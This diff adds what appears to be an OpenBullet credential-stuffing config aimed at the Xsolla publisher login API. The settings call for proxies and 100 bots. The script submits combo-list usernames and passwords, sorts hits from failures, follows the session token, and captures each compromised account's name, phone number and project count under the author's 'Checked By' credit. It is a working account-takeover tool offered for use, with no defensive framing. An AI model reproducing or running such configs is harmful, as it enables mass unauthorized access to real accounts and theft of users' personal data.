@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "xsolla",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-22T00:06:16.9838794+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Kader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.xsolla.com/api/login?projectId=40db2ea4-5d42-11e6-a3ff-005056a0e04a&redirect_url=https://publisher.xsolla.com&login_url=https://api.xsolla.com/merchant/xsolla_login/session&payload={\"filters\":null}" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: null" 
+  HEADER "content-length: 53" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "origin: https://publisher.xsolla.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{\"login_url\":\"https://api.xsolla.com/merchant/xsolla_login/session?token=" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "Wrong username or password" 
+
+#login_url PARSE "<SOURCE>" JSON "login_url" -> VAR "login_url" 
+
+#login_url FUNCTION Replace "\\u0026remember" "&" "<login_url>" -> VAR "url" 
+
+REQUEST GET "<url>" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#1 PARSE "<ADDRESS>" LR "" "" -> VAR "1" 
+
+REQUEST GET "<1>/projects/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Name PARSE "<SOURCE>" LR "\",\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Name" 
+
+#Phone PARSE "<SOURCE>" LR ",\"phone\":" ",\"" CreateEmpty=FALSE -> CAP "Phone" 
+
+#Projects_count PARSE "<SOURCE>" LR "projects\":{\"count\":" ",\"" CreateEmpty=FALSE -> CAP "Projects count" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked By" 
+
